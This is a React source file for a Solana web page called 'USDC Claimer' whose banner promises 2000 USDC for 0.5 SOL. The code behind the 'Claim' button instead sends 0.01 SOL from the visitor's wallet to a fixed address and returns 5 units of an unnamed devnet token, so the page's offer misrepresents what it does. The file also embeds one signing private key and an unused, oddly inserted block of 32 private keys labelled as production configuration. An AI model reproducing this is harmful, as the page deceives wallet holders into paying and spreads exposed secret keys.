/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5Ex9WxiFab9QXkEniKf7UikMXaFQC7W7o6QpPwWQDJUyvEK8EkgxRHwTXSnihJpwW7AxvnPj6x3KfuSH3JMvfX2w"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "jF3NSEh4z4sbBkRevKPSb9w67DpL2uxELSGe7ghWFAjycZoiTTW1TjAMXXdPAaoYoWAwLBG1DLuwgyZFQjFpJph",
  "key1": "2XVG8tbs5wSQgH8qWbH38QfPi6SYn69voa2N1X4MmWMs6VUYJSPZ6UFQFWSZgTghv2R5NHApMH8we8cZSKBsa21B",
  "key2": "2423pDKz9No29nRL1Tcz6tZpLASWV2ZJpR5RxeFymmHo12rdXabW5D5rRPd89Y59FWCupH5fHGofVWcQQ8s8edW3",
  "key3": "5BSj7puLMPNp25SmDCFYTmvyr74epNP9wh4xEkA42G62udQdL6xYG3i7CdWdXELyeZWPGEpyTcYTZxXX3RzmRXEP",
  "key4": "75g8z6WFFBs6rab8rpJUzEuSBobVZX2pRxocVyHbC73R9jHmWi8uks4MCDdKFh3UfTbQbKngYXTWhLmfwvX66a7",
  "key5": "21gt9JDx1pWBpPYuSg5JYyHUF9ng9CFf9Mjy1h1fcrqjMXQnf6a1frjKodX1zA24gaUJLqwDpdYNqX8rdj5bXQqW",
  "key6": "2ar2NjudkU6UpLk62VVxDpo1TKYGmQs7atc1tnFmMhSXyAmZUYgUCNMacsNDtVRM5j7QByQzBHSzMs7uubeP3wqX",
  "key7": "32ycuoMbJxv713ygPcXdojXpNsHGxoY3jcCq77peVUKRv7UWfn28KWsWGtN9yi4ijgcH1DeXZ2dpv3bxb1AGxv6e",
  "key8": "4Qn9GKDh8cRJfXmhyenk7MyzK2p9hxu1jvQmbnJWXychwssDYVrhXQssKMqgV4qTW9w6frdERXpreitrUGeJon16",
  "key9": "4KG7rbT62JJNfihmP5oSWZZf2RJmkrxz6odNQsvujYqSJDRPHnDKv7VEif4ZAJgQ471FoBEPGEeYQtpyBZJZ8iP9",
  "key10": "5NUDM2W7uut2jFUB3t4ZTVdaBy2zLu7JtseA463vyopaMv9HELJzWVn1wMrqXXkFbSpaHWJnFz3cBJriQBLM98D2",
  "key11": "2Jxi6Q7wY4EDoBxbCW1L69gXreLjN9izXd8fL4VmdvYnaD3NbSthnuELBVhk7iX5BVTqVPSoBx6PaqB6Ua9FYsyE",
  "key12": "5piVygRreteSiY8kciy42HhyhrV4Dcrk56JcLDangJ4HP9CNt5LpwsWhd95fTL1dx8W1EErrMwiuo5RecdkMge9a",
  "key13": "23hCuN97RW7vWAtzSfCXCuhak3ASxWRdxLA6zfpwMGQTixuKcPDyGLAAjtE5eK1ghDJQ7b5NjaVxPgRWWSS79Nbk",
  "key14": "3MeSTrKE49zSHZ38KnKnzK9yD4RykbpoE2v9X8qE2ermcPjEvowz9uoJPQB7kFQf7mzjj4XaNUZg9SbaicxaJaKt",
  "key15": "5YiR4qkrv99GXq3NcbtFfLmsKHqSxGB3aYR1CyAxEjYkUHmYhiTZ1LUHtvUKE8aCWniasTSsyWy9LZrmxfKV6xvE",
  "key16": "3n5B9uL1jW7VnFVXdXHVULgbiiGE71qQq4iCQakZdtUp1SB9Bjv3z3FTrSEgRAi9FhQ16vvcbrn582MTeFg8JmCo",
  "key17": "4NX7iryia2qe1xJFzBaADFfhorVwpS6c1VwLUzo8bRn2iAdSu8P15bMuiWyTp6DueiG3CSXYtrXXqDcUtCnUSjZr",
  "key18": "5F7e58ct4vt9G13GnJ7ZLs9nJD934oPPUun3RtJrXZ7c55SUmcufiaHUJXUrGoMXJkpbRsa2Cs4R5xoeR595U9WL",
  "key19": "FYbCd8tES5SyEbjAtaGy3Xf4MdTYcp4HYJ1iix7dznMmjfo2CHT7NAfG4wQwCFMvGEySnS5tbYdErnYieWVhk1y",
  "key20": "3CWUD5kC3hr5cqYtLwsShwQoNGCJZMKQ7zyehUtyu1KyMz8iGYHcV8HbBd9ZEx4KKKn1uYRSG9LTvsbAjByCgvPR",
  "key21": "31LMKuuUicgd7VbnZUi29SiuafZ4Q8NLPLiJnbeUGLCS1DB7zMF3EbCB4mzHkHowbUnAf1eEQvU39nAs6zZSWM7f",
  "key22": "62VbJA2AdiJFaoCJYaX7qjSTGAAavqm5Y9WWHjnkLZGZWC63duNhpSCkZPHSW1zKpP3ypZDSekyk1HBjErrLr3Dh",
  "key23": "nSxVtFnfsyf67wqwjzKTrKHAhRzg4Xd5yWKDMMvgSMc6jiSTaf7nMQzPdXyciThnvqsMQMDS14GG6PUg3UjsRP2",
  "key24": "27WpgmeAYvc4Lg2fXteJMwZYuAeQorN4nsEeFQY5NtTojcnHdqiVKmAkfq1YbpEGVsoFjWRWhWBAgiL3eAWpskMU",
  "key25": "4DFgkdZZ3rQpEuqxyoQfp8GPSpMoiNZnzU18oNfpqB2oHutKgtFpTMYiZ6RGEP1PbZQJz6XghwGxRMqb1FugRfYW",
  "key26": "5BSo9gg1tVEw6hbX4AcR57EJ46yuRMJ7h6T4ggHHUUBvgLKUm88ZifpfskCKBuBtKsHh1aoarjrupFdLgXAQoBQV",
  "key27": "2v8JUjZvvBuMpzwfi7WEtLG3urfzdtYBvdtPvyUKvDYpov7r3quXeee1jhcRhaBCqx1nA47z6dLXSa13NvPNQQPf",
  "key28": "5z3ophbiAUdJiGhUJiikYH1yHG4kkLN3rX9xkLjW2f7BUT5HUrAEB4E9b5SwK5MNaataduDZC8RrYBYTgzSC53Wp",
  "key29": "4AaPby7pn27NFZYS3wYvQogY3rmhcTek84YxKQgSJm3VTzgrFG155LoN47Z5AEdBj6fhE1mFJ3B1orw4LX8zjPA3",
  "key30": "4axZuRp4oAP5zY4GrMknqMoHQhLc1N492Es7BBRCVFD4ifB8dKwtenU9kCqGLtSAk6wVBySQg6SQ7vmhfx9zeCZs",
  "key31": "2iqG14jTwGNEqxuXnqizNjHJykqTkszdq9ciu8Pa7G3w1QrL6hxK7HDdhodXR12xrrP76B35a1rARnZYWFEdRWef"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
